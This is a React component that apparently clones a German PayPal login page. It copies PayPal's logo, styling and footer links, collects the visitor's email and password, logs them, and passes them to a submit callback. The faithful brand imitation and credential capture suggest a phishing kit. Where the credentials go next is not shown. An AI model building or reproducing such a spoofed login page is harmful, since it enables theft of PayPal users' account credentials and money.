import { useState } from 'react';
import '../styles/PayPalStyle.css';

interface Form1Props {
  onSubmit: (data: { email: string; password: string }) => void;
}

function Form1({ onSubmit }: Form1Props) {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log('Form data being submitted:', formData); // Debug log
    onSubmit(formData);
  };

  return (
    <div className="paypal-container">
      <div className="paypal-form-container">
        <div className="paypal-logo-container">
          <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="PayPal Logo" className="paypal-logo-img" />
        </div>
        
        <form onSubmit={handleSubmit} className="paypal-form">
          <div className="paypal-input-group textInput" id="splitEmailSection">
            <div className="fieldWrapper">
              <input
                type="email"
                className="paypal-input"
                id="email"
                placeholder="E-Mail-Adresse oder Handynummer"
                name="email"
                value={formData.email}
                onChange={handleChange}
                required
                autoComplete="off"
                autoCapitalize="off"
                spellCheck="false"
              />
              {formData.email && <label htmlFor="email" className="paypal-input-label">E-Mail-Adresse oder Handynummer</label>}
            </div>
          </div>
          
          <div className="paypal-input-group textInput" id="splitPasswordSection">
            <div className="fieldWrapper">
              <input
                type="password"
                className="paypal-input"
                id="password"
                placeholder="Passwort"
                name="password"
                value={formData.password}
                onChange={handleChange}
                required
                autoComplete="off"
              />
              {formData.password && <label htmlFor="password" className="paypal-input-label">Passwort</label>}
            </div>
          </div>
          
          <a href="#" className="forgot-email">E-Mail-Adresse vergessen?</a>
          
          <button type="submit" className="paypal-button-primary">
            Weiter
          </button>
          
          <div className="paypal-divider">
            <span>oder</span>
          </div>
          
          <button 
            type="button" 
            className="paypal-button-secondary"
            onClick={() => window.open('https://www.paypal.com/de/webapps/mpp/account-selection', '_blank', 'noopener,noreferrer')}
          >
            Neu anmelden
          </button>
        </form>
        
        <div className="paypal-language-selector">
          <span className="paypal-flag">🇩🇪</span>
          <span className="selected-language">Deutsch</span>
          <span className="dropdown-icon">▼</span>
          <span className="language-divider">|</span>
          <span className="language-option">English</span>
        </div>
      </div>
      
      <div className="paypal-footer">
        <a href="https://www.paypal.com/de/smarthelp/contact-us" target="_blank" rel="noopener noreferrer">Kontakt</a>
        <a href="https://www.paypal.com/de/webapps/mpp/ua/privacy-full" target="_blank" rel="noopener noreferrer">Datenschutz</a>
        <a href="https://www.paypal.com/de/webapps/mpp/ua/legalhub-full" target="_blank" rel="noopener noreferrer">AGB</a>
        <a href="https://www.paypal.com/de/webapps/mpp/country-worldwide" target="_blank" rel="noopener noreferrer">Weltweit</a>
      </div>
    </div>
  );
}

export default Form1;
